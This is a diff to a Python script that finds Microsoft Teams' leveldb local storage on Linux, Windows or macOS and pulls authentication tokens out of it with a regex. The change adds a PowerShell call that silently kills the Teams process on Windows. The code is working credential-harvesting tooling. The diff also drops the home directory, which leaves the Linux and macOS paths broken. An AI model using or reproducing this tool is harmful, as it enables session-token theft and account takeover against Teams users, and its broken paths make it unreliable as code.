@@ -2,18 +2,21 @@
 import re
 import os
 import platform
+import subprocess
 
 
 # Functions
 def get_teams_storage(system):
-    home = os.environ['HOME']
-    teams_dir = home
+    env = os.environ
+    teams_dir = ""
 
     match system:
         case "Linux":
             teams_dir += '/.config/Microsoft/Microsoft Teams/Local Storage/leveldb'
         case "Windows":
-            teams_dir +=  '/AppData/Roaming/Microsoft/Teams/Local Storage/leveldb'
+            subprocess.run(["powershell.exe", "Stop-Process -Name Teams -ErrorAction SilentlyContinue | Out-Null"])
+            teams_dir += env['USERPROFILE']
+            teams_dir += '\\AppData\\Roaming\\Microsoft\\Teams\\Local Storage\\leveldb'
         case "Darwin":
             teams_dir +=  '/Library/Application Support/Microsoft/Teams/Local Storage/leveldb'
 
@@ -46,15 +49,9 @@ def get_teams_tokens():
         teams_file.close()
 
         # Find all matches against the generic regex
-        matches = re.findall(generic_regex, file_string)
+        matches = re.findall(token_regex, file_string)
 
-        # Process findings to determine token alignment
-        count = 0
-        for find in matches:
-            count += 1
-
-            if count < len(matches):
-                if re.search(token_regex, matches[count]):
-                    tokens[find] = matches[count]
+        if matches:
+            tokens = matches
 
     return tokens
